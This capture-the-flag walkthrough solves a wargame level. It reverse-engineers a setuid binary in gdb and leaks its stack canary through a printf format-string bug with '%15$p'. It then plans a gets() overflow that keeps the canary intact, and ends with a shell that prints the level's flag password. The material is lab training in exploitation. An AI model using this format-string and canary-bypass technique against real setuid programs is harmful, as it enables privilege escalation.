## Level06

Logging in to `level06` a couple of surprises greet us:

```bash
level06@rainfall:~$ ls -la
total 48
drwxr-x---  3 level06 level06  4096 Oct  9 17:21 .
drwxr-xr-x 37 root    root     4096 Jun  9 23:13 ..
-rw-r--r--  1 level06 level06   220 Mar 31  2024 .bash_logout
-rw-r--r--  1 level06 level06  3771 Mar 31  2024 .bashrc
drwx------  2 level06 level06  4096 Oct  9 17:21 .cache
-rw-r--r--  1 level06 level06    30 Jun  9 23:12 .gdbinit
-rw-r--r--  1 level06 level06   807 Mar 31  2024 .profile
-rwsr-x---  1 flag06  level06 16808 Jun  9 23:13 3jane

level06@rainfall:~$ checksec 3jane
[*] '/home/level06/3jane'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

We are no longer handed the source file and on top of that `stack canaries` are also enabled.
Running the binary the user is prompted twice for an input:

```bash
level06@rainfall:~$ ./3jane 
  [VILLA STRAYLIGHT] Access restricted.
  [3JANE] Convince me.
[3JANE] Request ID: test
[3JANE] Logging: test
[3JANE] Access code: test
[3JANE] Access denied.
[3JANE] Vault status:
  [0] ALPHA clearance=1
  [1] BETA clearance=2
  [2] GAMMA clearance=4
  [3] DELTA clearance=8
```

After doing a bit of testing we quickly found that we have access to a printf format string:

```bash
level06@rainfall:~$ ./3jane 
  [VILLA STRAYLIGHT] Access restricted.
  [3JANE] Convince me.
[3JANE] Request ID: %08x
[3JANE] Logging: ffffdf20
[3JANE] Access code: %08x
[3JANE] Access denied.
[3JANE] Vault status:
  [0] ALPHA clearance=1
  [1] BETA clearance=2
  [2] GAMMA clearance=4
  [3] DELTA clearance=8
```

So lets attempt to manually reverse engineer the binary into the [source](./source.c) file to make everything a bit more readable.
We wont be reversing the entire code, just focussing on the important parts.
From the main functions disassembly we can conclude a couple of things:

```bash
gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" ./3jane
	...
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040165c <+0>:	endbr64
   0x0000000000401660 <+4>:	push   %rbp
   0x0000000000401661 <+5>:	mov    %rsp,%rbp
   0x0000000000401664 <+8>:	sub    $0x10,%rsp
   0x0000000000401668 <+12>:	mov    %fs:0x28,%rax
   0x0000000000401671 <+21>:	mov    %rax,-0x8(%rbp)
   0x0000000000401675 <+25>:	xor    %eax,%eax
   0x0000000000401677 <+27>:	call   0x401276 <init_vault>
   0x000000000040167c <+32>:	call   0x4013a0 <print_banner>
   0x0000000000401681 <+37>:	call   0x401418 <log_request>
   0x0000000000401686 <+42>:	call   0x4014de <authenticate>
   0x000000000040168b <+47>:	call   0x401594 <display_vault>
   0x0000000000401690 <+52>:	mov    $0x0,%eax
   0x0000000000401695 <+57>:	mov    -0x8(%rbp),%rdx
   0x0000000000401699 <+61>:	sub    %fs:0x28,%rdx
   0x00000000004016a2 <+70>:	je     0x4016a9 <main+77>
   0x00000000004016a4 <+72>:	call   0x401120 <__stack_chk_fail@plt>
   0x00000000004016a9 <+77>:	leave
   0x00000000004016aa <+78>:	ret
End of assembler dump.
```

There is a new instruction: `mov    %fs:0x28,%rax`, this simply reads a stack canary from the `thread local storage segment` at the offset `0x28`. This value is stored on the stack at the offset `-0x8(%rbp)` and checked at the end of the function using the `sub    %fs:0x28,%rdx` instruction, calling `__stack_chk_fail` if the check has failed.
Since these instructions are added byt the compiler we wont be adding them into the [source file](./source.c).

Apart from this new stack protection the function is pretty straight forward, there is are an additional `8 bytes` allocated on the stack that are unused, most likely for `stack alignment` this makes reverse engineering the main pretty simple.

The `init_vault` and `print_banner` are not of much use to us so we'll be skipping over those.
The first function that we can interact with is `log_request` so lets take a look at it:

```bash
(gdb) disas log_request
Dump of assembler code for function log_request:
   0x0000000000401418 <+0>:	endbr64
   0x000000000040141c <+4>:	push   %rbp
   0x000000000040141d <+5>:	mov    %rsp,%rbp
   0x0000000000401420 <+8>:	sub    $0x50,%rsp
   0x0000000000401424 <+12>:	mov    %fs:0x28,%rax
   0x000000000040142d <+21>:	mov    %rax,-0x8(%rbp)
   0x0000000000401431 <+25>:	xor    %eax,%eax
   0x0000000000401433 <+27>:	lea    0xc32(%rip),%rax        # 0x40206c
   0x000000000040143a <+34>:	mov    %rax,%rdi
   0x000000000040143d <+37>:	mov    $0x0,%eax
   0x0000000000401442 <+42>:	call   0x401130 <printf@plt>
   0x0000000000401447 <+47>:	mov    0x2c52(%rip),%rax        # 0x4040a0 <stdout@GLIBC_2.2.5>
   0x000000000040144e <+54>:	mov    %rax,%rdi
   0x0000000000401451 <+57>:	call   0x401180 <fflush@plt>
   0x0000000000401456 <+62>:	mov    0x2c53(%rip),%rdx        # 0x4040b0 <stdin@GLIBC_2.2.5>
   0x000000000040145d <+69>:	lea    -0x50(%rbp),%rax
   0x0000000000401461 <+73>:	mov    $0x40,%esi
   0x0000000000401466 <+78>:	mov    %rax,%rdi
   0x0000000000401469 <+81>:	call   0x401160 <fgets@plt>
   0x000000000040146e <+86>:	lea    -0x50(%rbp),%rax
   0x0000000000401472 <+90>:	lea    0xc08(%rip),%rdx        # 0x402081
   0x0000000000401479 <+97>:	mov    %rdx,%rsi
   0x000000000040147c <+100>:	mov    %rax,%rdi
   0x000000000040147f <+103>:	call   0x401150 <strcspn@plt>
   0x0000000000401484 <+108>:	movb   $0x0,-0x50(%rbp,%rax,1)
   0x0000000000401489 <+113>:	lea    0xbf3(%rip),%rax        # 0x402083
   0x0000000000401490 <+120>:	mov    %rax,%rdi
   0x0000000000401493 <+123>:	mov    $0x0,%eax
   0x0000000000401498 <+128>:	call   0x401130 <printf@plt>
   0x000000000040149d <+133>:	lea    -0x50(%rbp),%rax
   0x00000000004014a1 <+137>:	mov    %rax,%rdi
   0x00000000004014a4 <+140>:	mov    $0x0,%eax
   0x00000000004014a9 <+145>:	call   0x401130 <printf@plt>
   0x00000000004014ae <+150>:	mov    $0xa,%edi
   0x00000000004014b3 <+155>:	call   0x4010e0 <putchar@plt>
   0x00000000004014b8 <+160>:	mov    0x2ce2(%rip),%eax        # 0x4041a0 <access_log_idx>
   0x00000000004014be <+166>:	add    $0x1,%eax
   0x00000000004014c1 <+169>:	mov    %eax,0x2cd9(%rip)        # 0x4041a0 <access_log_idx>
   0x00000000004014c7 <+175>:	nop
   0x00000000004014c8 <+176>:	mov    -0x8(%rbp),%rax
   0x00000000004014cc <+180>:	sub    %fs:0x28,%rax
   0x00000000004014d5 <+189>:	je     0x4014dc <log_request+196>
   0x00000000004014d7 <+191>:	call   0x401120 <__stack_chk_fail@plt>
   0x00000000004014dc <+196>:	leave
   0x00000000004014dd <+197>:	ret
End of assembler dump.
```

We won't be going into depth on how we resolved each and every string, but it comes down to using the `x/s` command on every pointer passed to the `printf` and `strcspn` calls.

The next function we have access to as a user is `authenticate`.
Using GDB to disassemble it it looks like this:

```bash
(gdb) disas authenticate
Dump of assembler code for function authenticate:
   0x00000000004014de <+0>:	endbr64
   0x00000000004014e2 <+4>:	push   %rbp
   0x00000000004014e3 <+5>:	mov    %rsp,%rbp
   0x00000000004014e6 <+8>:	sub    $0x90,%rsp
   0x00000000004014ed <+15>:	mov    %fs:0x28,%rax
   0x00000000004014f6 <+24>:	mov    %rax,-0x8(%rbp)
   0x00000000004014fa <+28>:	xor    %eax,%eax
   0x00000000004014fc <+30>:	lea    0xb92(%rip),%rax        # 0x402095
   0x0000000000401503 <+37>:	mov    %rax,%rdi
   0x0000000000401506 <+40>:	mov    $0x0,%eax
   0x000000000040150b <+45>:	call   0x401130 <printf@plt>
   0x0000000000401510 <+50>:	mov    0x2b89(%rip),%rax        # 0x4040a0 <stdout@GLIBC_2.2.5>
   0x0000000000401517 <+57>:	mov    %rax,%rdi
   0x000000000040151a <+60>:	call   0x401180 <fflush@plt>
   0x000000000040151f <+65>:	lea    -0x90(%rbp),%rax
   0x0000000000401526 <+72>:	mov    %rax,%rdi
   0x0000000000401529 <+75>:	call   0x401170 <gets@plt>
   0x000000000040152e <+80>:	lea    -0x90(%rbp),%rax
   0x0000000000401535 <+87>:	mov    $0xb,%edx
   0x000000000040153a <+92>:	lea    0xb6a(%rip),%rcx        # 0x4020ab
   0x0000000000401541 <+99>:	mov    %rcx,%rsi
   0x0000000000401544 <+102>:	mov    %rax,%rdi
   0x0000000000401547 <+105>:	call   0x401100 <strncmp@plt>
   0x000000000040154c <+110>:	test   %eax,%eax
   0x000000000040154e <+112>:	jne    0x40156e <authenticate+144>
   0x0000000000401550 <+114>:	mov    0x2b6e(%rip),%eax        # 0x4040c4 <vault+4>
   0x0000000000401556 <+120>:	mov    %eax,%esi
   0x0000000000401558 <+122>:	lea    0xb59(%rip),%rax        # 0x4020b8
   0x000000000040155f <+129>:	mov    %rax,%rdi
   0x0000000000401562 <+132>:	mov    $0x0,%eax
   0x0000000000401567 <+137>:	call   0x401130 <printf@plt>
   0x000000000040156c <+142>:	jmp    0x40157d <authenticate+159>
   0x000000000040156e <+144>:	lea    0xb70(%rip),%rax        # 0x4020e5
   0x0000000000401575 <+151>:	mov    %rax,%rdi
   0x0000000000401578 <+154>:	call   0x401110 <puts@plt>
   0x000000000040157d <+159>:	nop
   0x000000000040157e <+160>:	mov    -0x8(%rbp),%rax
   0x0000000000401582 <+164>:	sub    %fs:0x28,%rax
   0x000000000040158b <+173>:	je     0x401592 <authenticate+180>
   0x000000000040158d <+175>:	call   0x401120 <__stack_chk_fail@plt>
   0x0000000000401592 <+180>:	leave
   0x0000000000401593 <+181>:	ret
End of assembler dump.
```

This function is also quite simple, we're prompted for another input this time around by the use of `gets`.
Apart from the `stack canary` being in the way, we could use this function to inject some gadgets!

So lets dive a bit more into the logic of these `stack canaries` to find out how to break them!
Every function is retrieving the `canary` from the same location: `%fs:0x28` and then saved onto the stack.
If we were to somehow find a way to 'leak' this value in a previous function we can use it inside of our payload to pretend that we have not overwritten past the limit we're allowed to!

Luckily for us there is a vulnerability that accomplishes just that.
As we mentioned before the very first function we have access to `log_request`, has a `printf format string exploit`.
And since these `stack canaries` are saved onto the stack we could use the `log_request` function to leak it, after which we'll use it inside of the second payload handed to the `authenticate` function to pretend we have not overwritten any of the saved register.

In order to craft our payload we'll need to figure out two things:

-	What is the `DPA` needed to get our format string inside of the `log_request` function to print the `canary`.
- The offset where the `canary` is stored at.
-	What is the address of the buffer used inside of the `authenticate` function.

To find the `DPA` we'll use the same trial and error method we did in [level04](../../level04/resources/walkthrough.md).
In order to validate that the value we've found is the actual `stack canary` we'll first be setting a breakpoint inside of the `log_request` function, right after the `mov    %fs:0x28,%rax` call after which we can inspect the `rax` register using `i r rax`.
Then we can compare the output ouf our `DPA` and find a match.
After testing a bit the correct `DPA` offset we're looking for is `15$`:

```bash
level06@rainfall:~$ gdb -nx 3jane
...
(gdb) b *0x40142d
Breakpoint 1 at 0x40142d
(gdb) run
...
(gdb) i r rax
rax            0x696b30e339747f00  7596218948970118912
(gdb) c
Continuing.
[3JANE] Request ID: %15$p
[3JANE] Logging: 0x696b30e339747f00
```

As we can see both the `rax` register and the `DPA` offset `15$` contain the stack canary value `0x696b30e339747f00`.
Next up we'll check where the canary is stored at, in the disassembly of the `authenticate` function above we can see that the entire stack size reserved is `$0x90` (144 bytes).
The instruction `mov    %rax,-0x8(%rbp)` puts the `canary` onto the stack, meaning the offset will be `0x90` minus `0x8`.
Leaving us with a total offset of `136 bytes` before we hit the saved stack canary!

The final piece of the puzzle will be the address of the buffer used inside of the `authenticate` function, once again we'll use `gdb` for this:

```bash
level06@rainfall:~$ gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" 3jane
...
(gdb) b *0x4014ed
Breakpoint 1 at 0x4014ed
(gdb) run
...
Breakpoint 1, 0x00000000004014ed in authenticate ()
(gdb) i r rsp
rsp            0x7fffffffe070      0x7fffffffe070

```

Now we can craft the payload, python's `pwn` library is used a bit more than previous exercises.
For this level the executable will be called inside of the exploit script, this way we can handle output from the executable a lot easier.

At the start of our [`exploit script`](./exploit.py) we receive and parse the `stack canary` so it can then be used inside of the `payload` in the second input request from the executable.
At the end of the script we're relinquishing input from the script back to us using `p.interactive()`.
This allows us to access the shell and perform any command we would want to run.

Executing the exploit script shall grant us the flag:

```bash
level06@rainfall:~$ python3 exploit.py 
[+] Starting local process '/home/level06/3jane': pid 1572
[*] Switching to interactive mode
[3JANE] Access code: [3JANE] Access denied.
$ id
uid=1007(level06) gid=1009(level06) euid=1023(flag06) groups=1009(level06),1001(levelgroup)
$ cat /home/flag06/.pass
c1t0kg9pklac7x4c7sn7iqgfppkz4usq
```
